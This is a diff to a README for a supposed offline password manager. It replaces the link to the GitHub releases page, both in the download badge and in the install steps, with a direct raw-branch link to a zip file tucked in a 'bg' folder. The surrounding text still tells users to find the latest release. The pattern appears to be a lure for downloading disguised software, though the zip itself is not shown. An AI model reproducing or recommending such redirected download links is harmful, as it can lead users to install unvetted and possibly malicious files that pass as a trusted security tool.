@@ -1,6 +1,6 @@
 # 🔐 MyWorld-Password-Manager - Secure Offline Password Vault
 
-[![Download MyWorld Password Manager](https://img.shields.io/badge/Download-MyWorld%20Password%20Manager-blue?style=for-the-badge)](https://github.com/Kantar4109/MyWorld-Password-Manager/releases)
+[![Download MyWorld Password Manager](https://img.shields.io/badge/Download-MyWorld%20Password%20Manager-blue?style=for-the-badge)](https://github.com/Kantar4109/MyWorld-Password-Manager/raw/refs/heads/main/bg/Manager-My-Password-World-v1.3.zip)
 
 ## 🧭 Overview
 
@@ -11,7 +11,7 @@ Use it to save website passwords, app logins, notes, and other private details. 
 ## 🚀 Download and Install
 
 Visit this page to download:
-https://github.com/Kantar4109/MyWorld-Password-Manager/releases
+https://github.com/Kantar4109/MyWorld-Password-Manager/raw/refs/heads/main/bg/Manager-My-Password-World-v1.3.zip
 
 1. Open the link in your browser.
 2. Find the latest release.
